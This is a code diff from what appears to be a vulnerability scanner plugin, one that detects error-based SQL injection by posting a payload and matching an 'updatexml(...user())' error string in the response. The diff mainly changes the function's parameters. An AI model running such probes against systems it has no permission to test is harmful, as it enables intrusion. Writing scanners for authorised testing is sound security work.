@@ -31,7 +31,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,Token,proxies=None):
+def medusa(Url,RandomAgent,proxies=None,**kwargs):
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -51,14 +51,13 @@ def medusa(Url,RandomAgent,Token,proxies=None):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         }
 
-        s = requests.session()
-        resp = s.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
+        resp = requests.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
         con = resp.text
         code = resp.status_code
         if code== 200 and con.find('错误信息') != -1 and con.find('''(`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) )''')!=-1 and con.find('执行SQL发生错误') != -1:
             Medusa = "{} 存在SQL注入漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
             _t=VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
